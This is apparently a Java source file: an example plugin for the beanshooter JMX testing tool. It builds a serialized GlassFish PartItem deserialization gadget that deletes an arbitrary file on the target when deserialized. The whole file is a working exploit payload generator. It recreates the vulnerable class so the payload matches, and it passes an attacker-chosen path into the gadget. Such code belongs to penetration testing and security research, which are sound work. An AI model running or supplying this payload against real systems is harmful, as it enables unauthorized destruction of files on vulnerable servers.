package org.apache.catalina.fileupload;

import java.io.File;
import java.io.Serializable;
import eu.tneitzel.beanshooter.cli.Operation;
import eu.tneitzel.beanshooter.exceptions.PluginException;
import eu.tneitzel.beanshooter.plugin.IPayloadProvider;

/**
 * The PartItemProvider class represents an example for a beanshooter plugin that implements IPayloadProvider.
 * The plugin is intended to be used during beanshooters serial action to provide a custom deserialization
 * gadget. The provided gadget is the PartItem class that is available by default in GlassFish.
 *
 * A payload provider is called with the currently executed beanshooter operation, the requested gadget name
 * and the specified gadget arguments. The operation and gadget name allow the provider to validate whether the
 * specified command line arguments make sense for the gadget to be created. In the example below, only the
 * gadget name is validated to be "PartItem".
 *
 * PartItem is a class present in the web-core module of GlassFish. It contains a vulnerable readObject and
 * finalize method, that can be abused to perform file operations during deserialization. Since the PartItem
 * class is very simple and only needs to contain one field for a deserialization attack, we define the class
 * ourselves within this payload provider. The more common scenario would be to import the vulnerable dependencies
 * (web-core.jar in our case) and to construct the payload as a regular object.
 *
 * The payload object returned by this provider represents the PartItem class and only contains the dfosFile field.
 * Upon deserialization, the file contained within this field gets deleted.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class PartItemProvider implements IPayloadProvider
{
    public Object getPayloadObject(Operation operation, String gadget, String arg) throws PluginException
    {
        if (!gadget.equals("PartItem"))
        {
            throw new PluginException("The gadget name '" + gadget + "' is not implemented by this provider.");
        }

        return new PartItem(arg);
    }
}

class PartItem implements Serializable
{
    private static final long serialVersionUID = 2237570099615271025L;
    public File dfosFile;

    public PartItem(String path)
    {
        this.dfosFile = new File(path);
    }
}
